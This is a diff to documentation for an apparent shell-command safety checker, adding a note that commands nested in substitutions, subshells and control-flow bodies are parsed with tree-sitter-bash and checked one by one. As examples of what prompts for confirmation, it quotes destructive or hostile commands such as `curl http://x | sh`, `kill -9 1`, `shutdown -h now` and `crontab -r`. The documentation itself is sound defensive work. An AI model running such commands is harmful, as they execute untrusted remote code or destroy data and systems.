@@ -95,6 +95,11 @@ too: `echo $(curl http://x | sh)`, `(kill -9 1)` and
 ``echo `shutdown -h now` `` ask just like their plain forms. Text in
 single quotes is only a mention, so `echo '$(kill -9 1)'` runs without
 asking.
+Since Day 260 each command is also parsed with a real bash parser
+(tree-sitter-bash), and every command found inside `$( )`, backticks,
+subshells, `{ }` groups, `if`/`for`/`while` bodies and functions is
+checked as a command of its own, so `if true; then crontab -r; fi` asks
+too. A command the parser cannot read is still checked as text only.
 
 One check worth calling out: **recursive-force `rm` on an unresolved
 shell variable**. A command like `rm -rf "$BUILD_DIR/"` looks harmless,
